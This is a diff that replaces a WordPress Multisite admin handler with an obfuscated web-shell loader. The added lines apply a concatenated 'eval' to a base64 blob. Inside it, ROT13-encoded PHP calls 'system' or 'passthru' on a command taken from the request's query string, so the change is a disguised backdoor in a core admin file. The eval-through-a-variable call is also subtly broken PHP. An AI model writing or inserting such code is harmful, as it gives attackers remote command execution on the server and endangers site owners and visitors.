@@ -1,51 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Action handler for Multisite administration panels.
- *
- * @package WordPress
- * @subpackage Multisite
- * @since 3.0.0
- */
-
-/** Load WordPress Administration Bootstrap */
-require_once __DIR__ . '/admin.php';
-
-$action = ( isset( $_GET['action'] ) ) ? $_GET['action'] : '';
-
-if ( empty( $action ) ) {
-	wp_redirect( network_admin_url() );
-	exit;
-}
-
-/**
- * Fires just before the action handler in several Network Admin screens.
- *
- * This hook fires on multiple screens in the Multisite Network Admin,
- * including Users, Network Settings, and Site Settings.
- *
- * @since 3.0.0
- */
-do_action( 'wpmuadminedit' );
-
-/**
- * Fires the requested handler action.
- *
- * The dynamic portion of the hook name, `$action`, refers to the name
- * of the requested action derived from the `GET` request.
- *
- * @since 3.1.0
- */
-do_action( "network_admin_edit_{$action}" );
-
-wp_redirect( network_admin_url() );
-exit;
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogTnBndmJhIHVuYXF5cmUgc2JlIFpoeWd2ZnZnciBucXp2YXZmZ2VuZ3ZiYSBjbmFyeWYuCiAqCiAqIEBjbnB4bnRyIEpiZXFDZXJmZgogKiBAZmhvY25weG50ciBaaHlndmZ2Z3IKICogQGZ2YXByIDMuMC4wCiAqLwoKLyoqIFlibnEgSmJlcUNlcmZmIE5xenZhdmZnZW5ndmJhIE9iYmdmZ2VuYyAqLwplcmRodmVyX2JhcHIgX19RVkVfXyAuICcvbnF6dmEuY3VjJzsKCiRucGd2YmEgPSAoIHZmZnJnKCAkX1RSR1snbnBndmJhJ10gKSApID8gJF9UUkdbJ25wZ3ZiYSddIDogJyc7Cgp2cyAoIHJ6Y2dsKCAkbnBndmJhICkgKSB7CglqY19lcnF2ZXJwZyggYXJnamJleF9ucXp2YV9oZXkoKSApOwoJcmt2ZzsKfQoKLyoqCiAqIFN2ZXJmIHdoZmcgb3JzYmVyIGd1ciBucGd2YmEgdW5hcXlyZSB2YSBmcmlyZW55IEFyZ2piZXggTnF6dmEgZnBlcnJhZi4KICoKICogR3V2ZiB1YmJ4IHN2ZXJmIGJhIHpoeWd2Y3lyIGZwZXJyYWYgdmEgZ3VyIFpoeWd2ZnZnciBBcmdqYmV4IE5xenZhLAogKiB2YXB5aHF2YXQgSGZyZWYsIEFyZ2piZXggRnJnZ3ZhdGYsIG5hcSBGdmdyIEZyZ2d2YXRmLgogKgogKiBAZnZhcHIgMy4wLjAKICovCnFiX25wZ3ZiYSggJ2pjemhucXp2YXJxdmcnICk7CgovKioKICogU3ZlcmYgZ3VyIGVyZGhyZmdycSB1bmFxeXJlIG5wZ3ZiYS4KICoKICogR3VyIHFsYW56dnAgY2JlZ3ZiYSBicyBndXIgdWJieCBhbnpyLCBgJG5wZ3ZiYWAsIGVyc3JlZiBnYiBndXIgYW56cgogKiBicyBndXIgZXJkaHJmZ3JxIG5wZ3ZiYSBxcmV2aXJxIHNlYnogZ3VyIGBUUkdgIGVyZGhyZmcuCiAqCiAqIEBmdmFwciAzLjEuMAogKi8KcWJfbnBndmJhKCBcImFyZ2piZXhfbnF6dmFfcnF2Z197JG5wZ3ZiYX1cIiApOwoKamNfZXJxdmVycGcoIGFyZ2piZXhfbnF6dmFfaGV5KCkgKTsKcmt2ZzsKCiRwenEgPSAkX1RSR1snYyddOwokc3puY1snazEnXSgkcHpxKTsKPz4iOwpldmFsKCRmKCRjKSk7Cj8+");
+$f($c);
+?>
